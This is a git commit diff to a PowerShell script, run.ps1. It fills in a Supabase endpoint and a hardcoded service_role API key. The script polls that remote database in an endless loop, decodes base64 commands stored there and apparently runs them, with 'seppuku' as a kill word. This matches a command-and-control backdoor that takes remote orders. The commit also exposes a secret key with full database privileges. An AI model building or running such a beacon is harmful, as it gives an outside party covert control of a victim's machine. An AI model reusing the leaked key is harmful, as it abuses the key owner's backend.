ae9337ee291d16127d892d2870daeae08355c026
yuan-miranda <yuanezekielamiranda@gmail.com>
2026-04-13 10:15:26 +0800

    Update API endpoint and key in run.ps1; modify command handling logic

--- run.ps1
+++ run.ps1
@@ -1,5 +1,5 @@
-$BASE_URL = ""
-$API_KEY = ""
+$BASE_URL = "https://dkrlxecasaxmcnssuqdr.supabase.co/rest/v1"
+$API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRrcmx4ZWNhc2F4bWNuc3N1cWRyIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NTMyODEyMCwiZXhwIjoyMDkwOTA0MTIwfQ.U05G6GDmpCbxaE-inxUzIumFlRKCUbmkNdlZ8fY8XLA"
 
 $h = @{
     "apikey"        = $API_KEY
@@ -17,7 +17,7 @@ while ($true) {
         
         # run command
         if ($r.run -eq $true) {
-            Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"run": false}' | Out-Null
+            Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"cmd": null, "run": false}' | Out-Null
 
             $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.cmd))
             if ($c -eq "seppuku") { exit }
